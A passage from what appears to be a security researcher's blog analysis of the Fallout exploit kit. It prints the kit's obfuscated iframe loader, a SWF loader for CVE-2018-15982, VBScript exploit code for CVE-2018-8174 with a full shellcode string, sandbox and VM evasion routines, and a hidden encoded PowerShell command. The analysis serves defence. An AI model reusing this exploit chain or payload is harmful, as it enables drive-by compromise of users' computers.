    <span class="nx">l1III11</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">l1III11</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">llIll1lI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIl1l1I</span><span class="p">);</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>For swf loader, the following code is executed.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"BnjJbx"</span><span class="nt">&gt;&lt;object</span> <span class="na">classid=</span><span class="s">"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"</span> <span class="na">width=</span><span class="s">"205"</span> <span class="na">height=</span><span class="s">"528"</span> <span class="na">id=</span><span class="s">"BnjJbx"</span> <span class="na">align=</span><span class="s">"middle"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"/24_02_1964/05_04_1933/3410-Skegger-12666"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"quality"</span> <span class="na">value=</span><span class="s">"high"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bgcolor"</span> <span class="na">value=</span><span class="s">"#ffffff"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"play"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"loop"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"wmode"</span> <span class="na">value=</span><span class="s">"window"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"scale"</span> <span class="na">value=</span><span class="s">"showall"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"menu"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"devicefont"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"salign"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"allowScriptAccess"</span> <span class="na">value=</span><span class="s">"sameDomain"</span> <span class="nt">/&gt;&lt;/object&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Thus, the swf file that exploits CVE-2018-15982 is read and executed.</p>

<h2 id="cve-2018-8174">CVE-2018-8174</h2>
<p>The exploit code used is very similar to PoC.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">StartExploit</span>
	<span class="n">UAF</span>
	<span class="n">InitObjects</span>
	<span class="n">vb_adrr</span><span class="o">=</span><span class="n">LeakVBAddr</span><span class="p">()</span>
	<span class="n">vbs_base</span><span class="o">=</span><span class="n">GetBaseByDOSmodeSearch</span><span class="p">(</span><span class="n">GetUint32</span><span class="p">(</span><span class="n">vb_adrr</span><span class="p">))</span>
	<span class="n">msv_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">vbs_base</span><span class="p">,</span><span class="s">"msvcrt.dll"</span><span class="p">)</span>
	<span class="n">krb_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"kernelbase.dll"</span><span class="p">)</span>
	<span class="n">ntd_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"ntdll.dll"</span><span class="p">)</span>
	<span class="n">VirtualProtectAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">krb_base</span><span class="p">,</span><span class="s">"VirtualProtect"</span><span class="p">)</span>
	<span class="n">NtContinueAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">ntd_base</span><span class="p">,</span><span class="s">"NtContinue"</span><span class="p">)</span>
	<span class="n">SetMemValue</span> <span class="n">GetShellcode</span><span class="p">()</span>
	<span class="n">ShellcodeAddr</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">8</span>
	<span class="n">SetMemValue</span> <span class="n">WrapShellcodeWithNtContinueContext</span><span class="p">(</span><span class="n">ShellcodeAddr</span><span class="p">)</span>
	<span class="n">lIlll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">69596</span>
	<span class="n">SetMemValue</span> <span class="n">ExpandWithVirtualProtect</span><span class="p">(</span><span class="n">lIlll</span><span class="p">)</span>
	<span class="n">llIIll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span>
	<span class="n">ExecuteShellcode</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="n">StartExploit</span>
</code></pre></div></div>

<p>The process to generate shellcode is like this.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Function</span> <span class="nf">GetShellcode</span><span class="p">()</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u0000%u0000%u0000%u0000"</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u8B55%u83EC%uF8E4%uEC81%u00CC%u0000%u5653%uE857%u08B0%u0000%uF08B%u44C7%u1824%u05CD%u5379%u848D%uB024%u0000%u8900%u2474%u8934%u2444%u8D14%u2454%u8D10%u2444%uC744%u2444%u1D1C%u2BDE%u8982%u2444%u8D10%u244C%u8D14%u2484%u0094%u0000%u4489%u2824%u448D%u1824%u8D50%u2444%u502C%u1EE8%u0006%u8B00%u245C%u8D18%u244C%u8B18%u247C%u8B1C%u8903%u2444%u8B40%u1C47%u4489%u4424%u478B%u8920%u2444%u3348%u89C0%u2444%u8918%u2444%u891C%u2444%uE834%u02E9%u0000%u548D%u1C24%uCF8B%u66E8%u0002%u8300%u2464%u0038%u4C8D%u2024%u406A%uE856%u02FE%u0000%uC683%u8D40%u244C%u6828%u0080%u0000%uE856%u02EC%u0000%u74FF%u2C24%u4C8B%u5024%u448D%u4824%u74FF%u2C24%uD68B%u74FF%u4824%u5753%u8D50%u2444%u5060%u448D%u4C24%uE850%u0389%u0000%uDB33%uC483%u3938%u245C%u742C%u8B41%u2474%u8D38%u2444%u6A48%u5F44%u5357%uFF50%u83D6%u0CC4%u7C89%u4824%u448D%u1824%u106A%u5053%uD6FF%uC483%u8D0C%u2444%u5018%u448D%u4C24%u5350%u6853%u0000%u0800%u5353%uFF53%u2474%u5350%u54FF%u6424%uFF53%u2454%u5F44%u5B5E%uE58B%uC35D%u8B55%u83EC%u0CEC%u458B%u890C%uF445%u458B%u8908%uF845%u6583%u00FC%u07EB%u458B%u40FC%u4589%u8BFC%uFC45%u453B%u7310%u8B12%uF845%u4503%u8BFC%uF44D%u4D03%u8AFC%u8809%uEB08%uC9DF%u55C3%uEC8B%u458B%u0F08%u00BE%uC085%u2D74%u458B%u0F08%u00BE%uF883%u7C41%u8B19%u0845%uBE0F%u8300%u5AF8%u0E7F%u458B%u0F08%u00BE%uC083%u8B20%u084D%u0188%u458B%u4008%u4589%uEB08%u5DC9%u55C3%uEC8B%u8B51%u0845%u4589%uEBFC%u8B07%uFC45%u8940%uFC45%u458B%u0FFC%u00BE%uC085%u0274%uEDEB%u458B%u2BFC%u0845%uC3C9%u5653%u8B57%u33D9%u53FF%u3347%uE8F6%uFFC9%uFFFF%u8B59%u85C8%u74C9%u0F24%u03B6%uD233%uC703%uF1BF%u00FF%uF700%u43F7%uFA8B%uD233%u048D%uBE3E%uFFF1%u0000%uF6F7%uF28B%uE983%u7501%uC1DC%u10E6%u048D%u5F37%u5B5E%u55C3%uEC8B%uEC83%u5310%u5756%uF98B%u5589%u33FC%u8BF6%u3C47%u5C8B%u7838%uDF03%u438B%u8B1C%u204B%uC703%u4589%u03F0%u8BCF%u2443%uC703%u4D89%u89F8%uF445%u7339%u7618%u8B18%uB10C%uCF03%u7BE8%uFFFF%u3BFF%uFC45%u1074%u4D8B%u46F8%u733B%u7218%u33E8%u5FC0%u5B5E%uC3C9%u458B%u8BF4%uF04D%uB70F%u7004%u048B%u0381%uEBC7%u64EA%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u8B00%u1040%u64C3%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u1040%u56C3%u8B57%u8BF9%u56F2%u078B%uD0FF%uC085%u0675%u478B%u5604%uD0FF%u5E5F%u56C3%uF18B%uE856%uFEAB%uFFFF%u8B59%uE8CE%uFF06%uFFFF%u3D5E%u06DE%u3F54%u1F74%u413D%uCD05%u7425%u3D18%u0309%u0F05%u1174%uEC3D%u1803%u7416%u3D0A%u044B%u19F3%u0374%uC033%u33C3%u40C0%u55C3%uEC8B%uEC81%u013C%u0000%u418B%u5308%u5756%uFA8B%uDB33%u518B%u890C%uF855%u518B%u8B10%u1449%u6A53%u8902%uFC55%u4D89%uFFF4%u8BD0%u83F0%uFFFE%u4074%u858D%uFEC8%uFFFF%u85C7%uFEC8%uFFFF%u0128%u0000%u5650%u55FF%u85F8%u74C0%u8D27%uEC8D%uFFFE%uE8FF%uFF6F%uFFFF%uC085%u1575%u858D%uFEC8%uFFFF%u5650%u55FF%u85FC%u75C0%u56E2%u55FF%uEBF4%u3303%u43DB%u1F89%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u5756%uC033%uF98B%u3340%u53C9%uA20F%uF38B%u8D5B%uF05D%u0389%u7389%u8904%u084B%u5389%u8B0C%uF845%uE8C1%u891F%u5F07%u5B5E%uC3C9%u8B55%u81EC%u04EC%u0001%u5300%u3356%u57F6%uC68B%u8488%uFC05%uFFFE%u40FF%u003D%u0001%u7200%u8BF1%u8BDE%u8BFE%u8AF1%u3D94%uFEFC%uFFFF%uC78B%uE083%u0F07%uCAB6%uB60F%u3004%uC303%uC803%uB60F%u8AD9%u1D84%uFEFC%uFFFF%u8488%uFC3D%uFFFE%u47FF%u9488%uFC1D%uFFFE%u81FF%u00FF%u0001%u7200%u8BC8%u0C7D%uF633%uDE8B%uFF85%u5574%u458B%u8908%u0C45%u438D%u0F01%uD8B6%u948A%uFC1D%uFFFE%u0FFF%uC2B6%uC603%uB60F%u8AF0%u3584%uFEFC%uFFFF%u8488%uFC1D%uFFFE%u88FF%u3594%uFEFC%uFFFF%uB60F%u1D8C%uFEFC%uFFFF%uB60F%u03C2%u8BC8%u0C45%uB60F%u8AC9%u0D8C%uFEFC%uFFFF%u0830%u8940%u0C45%uEF83%u7501%u8BB1%u0845%u5E5F%uC95B%u55C3%uEC8B%uEC83%u8B48%u1C45%u4D89%u53F4%u8B56%u8B08%u0870%u4D89%u8BF8%u0448%u4D89%u8BF0%u0C48%u4D89%u8BE8%u1048%u4D89%u8BE0%u1448%u4D89%u8BD8%u1848%u458B%u5714%u046A%u5589%u8BEC%u1850%u4D89%u8BC8%u2448%u458B%u6818%u1000%u0000%u046A%u006A%u388B%u5589%u89D4%uFC4D%u7D89%uFFD0%u6AD2%u8B04%u6AD8%u5300%u5D89%uFFE4%u83D7%u207D%u8D00%u1445%u046A%u5350%u1875%u7D83%u0024%u0975%u45C7%uC614%u90EA%uEB2A%uC71D%u1445%uF9D7%u2A90%u14EB%u7D83%u0024%u45C7%uD214%u90EB%u752A%uC707%u1445%uE4D2%u2A90%u29E8%uFFFC%u8BFF%u084D%u458D%u83C0%u0CC4%u45C7%uF4C0%uDBBC%uC770%uC445%uE14D%u1989%u086A%uE850%uFE76%uFFFF%u5959%uDB33%u458D%u53C0%u5353%u5053%u55FF%u8BF8%u85F8%u75FF%u8B0A%u1045%u1889%u23E9%u0001%u5300%u6A53%u5303%u6853%u01BB%u0000%u75FF%u57F4%u55FF%u8BF0%u89D8%u145D%uDB85%u840F%u00FB%u0000%u4D8B%u8D08%uB845%u086A%uC750%uB845%uC6E5%u1DB0%u45C7%u7CBC%uB9D1%uE819%uFE1C%uFFFF%u5959%uC033%u6850%u3000%u8080%u5050%uFF50%uEC75%u458D%u50B8%uFF53%uE855%uD88B%uDB85%u840F%u00B8%u0000%u046A%u75FF%u6AE4%u6A00%u5300%u55FF%u85E0%u0FC0%uA084%u0000%u8300%u1C65%u8D00%uDC45%u6583%u00DC%u8D50%u1845%u45C7%u0418%u0000%u5000%u458D%u501C%u0568%u0000%u5320%u55FF%u83D8%u187D%u7400%u8376%u1C7D%u7400%u6A70%u6804%u1000%u0000%u75FF%u6A1C%uFF00%uD455%u75FF%u8B1C%u0C4D%u006A%u8950%uFF01%uD055%u6583%u00CC%u458D%u50CC%u458B%uFF0C%u1C75%u30FF%uFF53%uC855%uFF53%uFFD6%u1475%uD6FF%uFF57%u83D6%u207D%u8B00%uFC75%u0474%u006A%uD6FF%u7D83%u0024%u0474%u006A%uD6FF%u458B%uFF0C%u1C75%u4D8B%uFF08%uE830%uFD52%uFFFF%u458B%u5910%uC759%u0100%u0000%uEB00%u5311%uD6FF%u75FF%uFF14%u57D6%uD6FF%u458B%u8310%u0020%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u8B56%u8BF1%u57DA%u7589%uE8FC%uFBF7%uFFFF%uF88B%u43BA%u1C04%u8B19%uE8CF%uFB83%uFFFF%u368B%u75BA%uB905%u8B28%u89CF%u1446%u72E8%uFFFB%u8BFF%uFC75%u51BA%u3209%u8B73%u890E%u1C41%uCF8B%u5EE8%uFFFB%u8BFF%uBA0E%u0614%u33F5%u4189%u8B08%uE8CF%uFB4D%uFFFF%u0E8B%u97BA%u8104%u891D%u8B01%uE8CF%uFB3D%uFFFF%u0E8B%u4DBA%u8505%u8927%u0441%uCF8B%u2CE8%uFFFB%u8BFF%uBA0E%u04E4%u2259%u4189%u8B0C%uE8CF%uFB1B%uFFFF%u0E8B%uD3BA%u7004%u891F%u1041%uCF8B%u0AE8%uFFFB%u8BFF%uBA0E%u047A%u1A1E%u4189%u8B18%uE8CF%uFAF9%uFFFF%u0E8B%uF3BA%u8503%u8915%u2041%uCF8B%uE8E8%uFFFA%u8BFF%u890E%u2441%u58E8%uFFFB%uBAFF%u028C%u08D8%uC88B%uD2E8%uFFFA%u8BFF%u6A0B%u890C%u8D01%uF045%u4D8B%u500C%u45C7%uC2F0%u8DE0%uC720%uF445%uB412%u37CD%u45C7%uEFF8%uF16B%uE8A4%uFC34%uFFFF%u5959%u0E8B%u558D%uE8F0%uFB2B%uFFFF%uF88B%u5DBA%u1006%u8B36%uE8CF%uFA91%uFFFF%u758B%uBA08%u0584%u29FB%u0E8B%u4189%u8B0C%uE8CF%uFA7D%uFFFF%u0E8B%u55BA%uC706%u8935%u1441%uCF8B%u6CE8%uFFFA%u8BFF%uBA0E%u078C%u4B92%u4189%u8B10%uE8CF%uFA5B%uFFFF%u0E8B%u55BA%u6406%u8936%u0841%uCF8B%u4AE8%uFFFA%u8BFF%uBA0E%u051D%u245C%u4189%u8B04%uE8CF%uFA39%uFFFF%u0E8B%u46BA%uC006%u8935%u8B01%uE8CF%uFA29%uFFFF%u0E8B%u5E5F%u895B%u1841%uC3C9%uECD7%u2182%uA319%u2DD6%u29FE%uCBFE%u5CE9%uB27D%u501A%uCF26%u6A47%u54FE%uDABA%u8A85%uEF83%u3361%u09D1%u20F7%u16EC%uD9B7%u917A%uDE1A%u2281%uEA7F%u3143%u6ACE%u1A52%u4FF4%u500B%uC276%u5A57%uC1F8%uE09A%u258F%uA209%u6BCD%u28EE%uE3E7%u2FD5%u8D28%u3568%uAE4A%u0623%u309B%u8E87%uE4E0%u8EF7%u5F02%u7AB4%u73DA%u7483%uB0D2%uBC0E%uB049%u40EE%u8610%u7665%u07AF%u7330%u3C80%u6436%uF745%u5A61%uC1F8%uBBE2%u5581%uF71D%u00A7%u7F8D%u4907%u11AF%uB565%uF4E6%u755E%u19EE%u23AF%u8DB6%uEB89%u2838%u11BF%uC109%u1219%uD17E%uBEEA%uDD49%uF759%u09D6%uEA08%u8E45%uB602%u1B93%u19C4%u9146%uB94D%u9E6C%u0BC7%u00E8%u0000%u5800%uE883%u2D05%u00C0%u0000%u00C3"</span> <span class="o">&amp;</span><span class="n">lIIII</span><span class="p">(</span><span class="n">IIIII</span><span class="p">(</span><span class="s">""</span><span class="p">)))</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">IIlI</span> <span class="o">&amp;</span> <span class="kt">String</span><span class="p">((</span><span class="o">&amp;</span><span class="n">h80000</span><span class="o">-</span><span class="n">LenB</span><span class="p">(</span><span class="n">IIlI</span><span class="p">))</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u4141"</span><span class="p">))</span>
	<span class="n">GetShellcode</span><span class="o">=</span><span class="n">IIlI</span>
<span class="k">End</span> <span class="k">Function</span>
</code></pre></div></div>

<p>Let’s read shellcode.</p>

<h2 id="shellcode">Shellcode</h2>
<p>The decoding algorithm in the shellcode has not changed from v3 and remains RC4.
<a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></p>

<p>The hash algorithm of API hash has not changed either.
API hashed by the dualaccModFFF1Hash algorithm.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">dualaccModFFF1Hash</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// esi</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">zz_count</span><span class="p">(</span><span class="n">this</span><span class="p">);</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">v1</span><span class="o">++</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">v5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However, there were interesting changes.
Analysis environment detection codes has been added in shellcode.</p>

<h3 id="vm-detection">VM Detection</h3>

<p>Query hypervisor precense using CPUID.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">zz_vm_detect</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">_EAX</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">cpuid</span> <span class="p">}</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="n">_ECX</span> <span class="o">&gt;&gt;</span> <span class="mi">31</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="process-detection">Process Detection</h3>
<p>Get a list of running processes.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/03.jpg" /></p>

<p>Convert process name to lower case.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">zz_tolowercase</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">a1</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">a1</span> <span class="o">&lt;=</span> <span class="mi">90</span> <span class="p">)</span>
      <span class="o">*</span><span class="n">a1</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
    <span class="o">++</span><span class="n">a1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Compare to the following hashes.
Once again, It uses the dualaccModFFF1Hash algorithm.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x3F5406DE
0x25CD0541
0x0F050309
0x161803EC
0x19F3044B
</code></pre></div></div>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/04.jpg" /></p>

<p>Two process names were identified. I do not know the others.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"wireshark.exe"</span><span class="p">))</span>
<span class="s">'0x25cd0541'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dualaccModFFF1Hash</span><span class="p">(</span><span class="s">"fiddler.exe"</span><span class="p">))</span>
<span class="s">'0x19f3044b'</span>
</code></pre></div></div>

<p>Like v3, shellcode downloads, decodes and executes encrypted PowerShell code.</p>

<h2 id="powershell">PowerShell</h2>
<p>The PowerShell code to be executed is like this.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-noni</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">dAByAHkAewAkAGwAMQBJAGwAMQA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQA7ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAD0AJABsADEASQBsADEALgBHAGUAdABUAHkAcABlACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFUAMwBsAHoAZABHAFYAdABMAGsAMQBoAGIAbQBGAG4AWgBXADEAbABiAG4AUQB1AFEAWABWADAAYgAyADEAaABkAEcAbAB2AGIAaQA1AEIAYgBYAE4AcABWAFgAUgBwAGIASABNAD0AJwApACkAKQA7ACQASQAxAEkAbAAxADEAbAAxAEkAbAA9ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAC4ARwBlAHQARgBpAGUAbABkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFkAVwAxAHoAYQBVAGwAdQBhAFgAUgBHAFkAVwBsAHMAWgBXAFEAPQAnACkAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAkAEkAMQBJAGwAMQAxAGwAMQBJAGwALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AH0AYwBhAHQAYwBoAHsAfQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAIgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQB7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAEkAbABJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABJAGwAMQBJADEASQBJADEAbAA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAEkASQBsAEkASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbAAxADEAMQBsAEkAbAAxAEkAMQBJADsAfQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwALABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABsAEkAMQBsAGwAMQBJAGwAMQBJADEA